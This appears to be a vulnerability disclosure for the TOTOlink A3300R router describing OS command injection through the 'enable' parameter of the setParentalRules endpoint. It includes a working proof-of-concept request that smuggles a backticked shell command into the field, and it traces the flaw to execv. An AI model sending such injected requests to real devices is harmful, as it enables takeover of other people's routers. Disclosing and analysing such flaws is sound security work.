# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](D:\typora 图片\image-20240109124617070.png)

## Vulnerability Description

When deal with  `setParentalRules` request,`enable` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1
Host: itotolink.net
Content-Length: 80
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/parental.html?token=C6F41C563E86A379
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"enable":"1`ls>/web/cmdi11.txt`","addEffect":"1","topicurl":"setParentalRules"}
```

injection the command "ls>/web/cmdi11.txt"

![image-20240119140140988](D:\typora 图片\image-20240119140140988.png)

check the result.

```
GET /cmdi11.txt HTTP/1.1
Host: itotolink.net
If-Modified-Since: Mon, 24 Oct 2022 09:43:03 GMT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/css,*/*;q=0.1
Referer: http://itotolink.net/advance/parental.html?token=C6F41C563E86A379
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

![image-20240119140146307](D:\typora 图片\image-20240119140146307.png)

## Analysis

sub_41D1E0 will handle the `setParentalRules` request. sub_41D1E0 get `enable` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240119140315288](D:\typora 图片\image-20240119140315288.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](D:\typora 图片\image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](D:\typora 图片\image-20240109131330610.png)

